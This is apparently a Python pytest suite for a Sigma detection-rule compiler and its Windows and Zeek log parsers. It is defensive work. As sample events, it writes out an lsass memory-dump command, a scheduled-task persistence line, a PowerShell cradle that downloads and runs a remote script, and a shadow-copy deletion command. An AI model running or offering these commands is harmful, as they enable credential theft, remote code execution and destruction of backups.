"""Automated Test Suite for Sigma Rule Compiler & Parser Integrations."""

import pytest
from backend.app.engines.sigma_compiler import (
    SigmaCompiler,
    SigmaEngine,
    sigma_engine,
    MatchModifier,
)
from backend.app.parsers.registry import registry
from backend.app.parsers.windows_deep import WindowsDeepParser
from backend.app.parsers.nsm_parsers import ZeekNSMParser, SuricataEVEParser


def test_sigma_compiler_exact_and_contains():
    rule_dict = {
        "id": "SIGMA-TEST-01",
        "title": "Test ProcDump Rule",
        "level": "high",
        "tags": ["attack.t1003.001", "attack.credential_access"],
        "detection": {
            "selection": {
                "Image|contains": ["procdump.exe", "procdump64.exe"],
                "CommandLine|contains": ["-ma", "lsass"],
            },
            "condition": "selection",
        },
    }
    compiled = SigmaCompiler.compile_rule(rule_dict)

    # Positive match
    event_pos = {
        "Image": "C:\\Tools\\procdump.exe",
        "CommandLine": "procdump.exe -ma lsass.exe out.dmp",
    }
    res_pos = compiled.match(event_pos)
    assert res_pos is not None
    assert res_pos["matched"] is True
    assert res_pos["rule_id"] == "SIGMA-TEST-01"
    assert "attack.t1003.001" in res_pos["mitre_attack"]

    # Negative match (different tool)
    event_neg = {
        "Image": "C:\\Windows\\System32\\notepad.exe",
        "CommandLine": "notepad.exe file.txt",
    }
    assert compiled.match(event_neg) is None


def test_sigma_compiler_boolean_and_not():
    rule_dict = {
        "id": "SIGMA-TEST-02",
        "title": "Schtasks persistence not Edge updater",
        "level": "medium",
        "detection": {
            "selection": {
                "Image|endswith": ["schtasks.exe"],
                "CommandLine|contains": ["/create"],
            },
            "filter": {
                "CommandLine|contains": ["MicrosoftEdgeUpdate"],
            },
            "condition": "selection and not filter",
        },
    }
    compiled = SigmaCompiler.compile_rule(rule_dict)

    # Malicious persistence
    match_evil = compiled.match({
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks.exe /create /tn Evil /tr cmd.exe /sc onlogon",
    })
    assert match_evil is not None
    assert match_evil["matched"] is True

    # Filtered legitimate updater
    match_legit = compiled.match({
        "Image": "C:\\Windows\\System32\\schtasks.exe",
        "CommandLine": "schtasks.exe /create /tn MicrosoftEdgeUpdate /tr edge.exe",
    })
    assert match_legit is None


def test_sigma_compiler_cidr_and_regex():
    rule_dict = {
        "id": "SIGMA-TEST-03",
        "title": "Suspicious External C2 Subnet",
        "level": "critical",
        "detection": {
            "selection": {
                "DestinationIp|cidr": ["198.51.100.0/24", "203.0.113.0/24"],
                "QueryName|re": [r"^[a-f0-9]{32}\.c2\.evil\."],
            },
            "condition": "selection",
        },
    }
    compiled = SigmaCompiler.compile_rule(rule_dict)

    res = compiled.match({
        "DestinationIp": "198.51.100.44",
        "QueryName": "d41d8cd98f00b204e9800998ecf8427e.c2.evil.com",
    })
    assert res is not None
    assert res["matched"] is True

    # IP out of CIDR
    res_wrong_ip = compiled.match({
        "DestinationIp": "10.0.0.1",
        "QueryName": "d41d8cd98f00b204e9800998ecf8427e.c2.evil.com",
    })
    assert res_wrong_ip is None


def test_builtin_sigma_engine_evaluations():
    # Test built-in PowerShell download cradle detection
    ps_event = {
        "process_name": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.50/stage.ps1')",
    }
    matches = sigma_engine.evaluate_event(ps_event)
    assert len(matches) >= 1
    assert any(m["rule_id"] == "SIGMA-002" for m in matches)

    # Test built-in Shadow copy deletion
    vss_event = {
        "process_name": "vssadmin.exe",
        "command_line": "vssadmin.exe delete shadows /all /quiet",
    }
    matches_vss = sigma_engine.evaluate_event(vss_event)
    assert len(matches_vss) >= 1
    assert any(m["rule_id"] == "SIGMA-003" for m in matches_vss)


def test_deep_parsers_with_registry():
    # Windows Security XML 4688 process creation
    xml_4688 = """
    <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
      <System>
        <Provider Name="Microsoft-Windows-Security-Auditing"/>
        <EventID>4688</EventID>
        <TimeCreated SystemTime="2026-09-12T04:00:00Z"/>
        <Computer>FIN-SRV-01</Computer>
      </System>
      <EventData>
        <Data Name="NewProcessName">C:\\Windows\\System32\\cmd.exe</Data>
        <Data Name="CommandLine">cmd.exe /c whoami</Data>
        <Data Name="SubjectUserName">svc_backup</Data>
      </EventData>
    </Event>
    """
    win_parser = registry.get_parser("windows")
    events = win_parser.parse(xml_4688)
    assert len(events) >= 1
    assert events[0]["event_id"] == "4688"
    assert events[0]["action"] == "New Process Created"
    assert events[0]["hostname"] == "FIN-SRV-01"


    # Zeek DNS JSON event
    raw_zeek_json = '{"ts":1773400000.0,"_path":"dns","id.orig_h":"10.0.0.5","id.resp_h":"1.1.1.1","id.resp_p":53,"proto":"udp","query":"evil-c2-domain.org","qtype_name":"A"}'
    zeek_parser = registry.get_parser("zeek")
    parsed_dns = zeek_parser.parse(raw_zeek_json)
    assert len(parsed_dns) >= 1
    assert parsed_dns[0]["dns_query"] == "evil-c2-domain.org"
    assert parsed_dns[0]["source_ip"] == "10.0.0.5"
